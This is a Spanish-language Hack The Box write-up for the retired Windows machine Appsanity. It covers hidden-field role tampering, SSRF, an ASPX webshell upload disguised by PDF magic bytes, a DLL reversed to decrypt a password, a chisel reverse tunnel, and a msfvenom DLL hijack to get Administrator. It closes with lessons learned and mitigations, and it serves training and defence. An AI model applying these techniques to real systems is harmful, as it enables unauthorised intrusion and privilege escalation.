---
machine: Appsanity
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, jwt, hidden-input, ssrf, upload, webshell, reversing, dll-hijack, privesc]
---

# Appsanity — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Dos portales .NET (`meddigi.htb` y `portal.meddigi.htb`) comparten el mismo secreto JWT. En el registro, el campo oculto `Acctype` se cambia de `1` a `2` para obtener el rol de doctor, y la cookie sirve en el segundo portal. Allí, el formulario de prescripciones es un SSRF y la subida de informes solo valida los magic bytes del PDF, no la extensión. Se sube un ASPX con cabecera `%PDF-1.5`, se localiza en una ruta predecible y se ejecuta a través del SSRF, lo que da shell como `svc_exampanel`. La DLL `ExaminationManagement.dll` revela una clave en el registro con la que se descifra la contraseña de `devdoc`; con WinRM se llega a esa cuenta. El servicio `ReportManagement` ejecuta `upload`, que carga `Libraries\externalupload.dll`: se reemplaza por una DLL maliciosa y se obtiene shell como Administrator.

## Reconocimiento

```bash
nmap -Pn -sCV -p80,443,5985 <IP>
```

- `80`/`443`: IIS con los dos portales.
- `5985`: WinRM.

```bash
echo '<IP> meddigi.htb portal.meddigi.htb' | sudo tee -a /etc/hosts
```

## Enumeración

`meddigi.htb` permite registrar una cuenta. En la petición `POST /Signup/SignUp` aparece un campo que no está visible en el formulario:

```text
Acctype=1
```

Se cambia a `Acctype=2` y el usuario recibe el rol de doctor. La cookie JWT es aceptada por `portal.meddigi.htb`, que muestra el panel médico.

El formulario de prescripciones envía un correo a un enlace controlado. Es un SSRF: se apunta a `https://127.0.0.1:<puerto>` y se fuzzea el puerto interno, lo que descubre el panel de administración en `8080`.

## Foothold

La sección de informes acepta PDF y guarda el archivo con un nombre predecible que termina en `_<nombre>`. La validación solo comprueba los primeros bytes, así que un archivo con `%PDF-1.5` y cuerpo ASPX se acepta y conserva la extensión `.aspx`.

```http
POST /Reports/Upload HTTP/1.1
Content-Type: multipart/form-data

%PDF-1.5
<%@ Page Language="C#" %><% Response.Write(...); %>
```

El informe queda en `ViewReport.aspx?file=<GUID>_dummy.aspx`. Se invoca mediante el SSRF:

```text
https://127.0.0.1:8080/ViewReport.aspx?file=<GUID>_dummy.aspx
```

Con una webshell ASPX se ejecuta una reverse shell como `svc_exampanel`.

## Movimiento lateral

La DLL del panel de exámenes está en:

```text
C:\inetpub\ExaminationPanel\ExaminationPanel\bin\examinationManagement.dll
```

Se copia a un share propio y se abre con dnSpy/dotPeek. La función `RetrieveEncryptionKeyFromRegistery` lee una clave del registro y la usa para descifrar credenciales. Con la clave y el texto cifrado se recupera la contraseña de `devdoc`:

```bash
netexec winrm <IP> -u devdoc -p '<PASSWORD>'
```

## Escalada de privilegios

`devdoc` puede acceder al servicio `ReportManagement`, que escucha en el puerto `100`. Se crea un túnel con Chisel y se abre la consola:

```bash
chisel client <LHOST>:8000 R:10000:127.0.0.1:100
rlwrap nc localhost 10000
```

El comando `upload` ejecuta:

```text
cmd.exe /c ReportManagementHelper Libraries\externalupload.dll
```

`C:\Program Files\ReportManagement\Libraries` es escribible. Se genera una DLL con `msfvenom`, se sube como `externalupload.dll` y se lanza `upload <origen>`; la DLL se carga como Administrator y devuelve una shell.

## Evidencia

- Registro con `Acctype=2` y acceso al portal con la misma cookie.
- SSRF contra `127.0.0.1:8080` y listado de puertos internos.
- PDF con magic bytes y extensión `.aspx` ejecutado por IIS.
- `examinationManagement.dll` y clave del registro para descifrar la contraseña de `devdoc`.
- `externalupload.dll` cargada por `ReportManagement` y shell como Administrator.

## Lecciones aprendidas

- Un campo oculto nunca es un control de autorización.
- Compartir el secreto JWT entre aplicaciones amplía el impacto de un rol elevado.
- Validar solo los magic bytes permite subir contenido ejecutable.
- Los nombres de archivo predecibles facilitan localizar el webshell.
- Una clave de cifrado en el registro no protege un secreto si el proceso la puede leer.
- Un servicio que carga DLL desde un directorio escribible es ejecución como su cuenta.

## Mitigaciones y detección

- Validar el rol en el servidor y no confiar en campos del formulario.
- Usar secretos JWT distintos por aplicación y rotarlos.
- Validar extensión, tipo real y contenido; renombrar y servir fuera del árbol web.
- Cifrar secretos con DPAPI o un almacén externo y restringir su lectura.
- Aplicar listas blancas de DLL y proteger `Libraries` con ACL.
- Monitorizar subidas `.aspx`, creación de DLL en Program Files y ejecución de `ReportManagementHelper`.

## Referencias

- [0xdf — Appsanity](https://0xdf.gitlab.io/2024/03/09/htb-appsanity.html)
- [Hack The Box — Appsanity](https://app.hackthebox.com/machines/appsanity)
- [Knowledge — dnSpy](../../../knowledge/reversing/dotnet-dnspy.md)
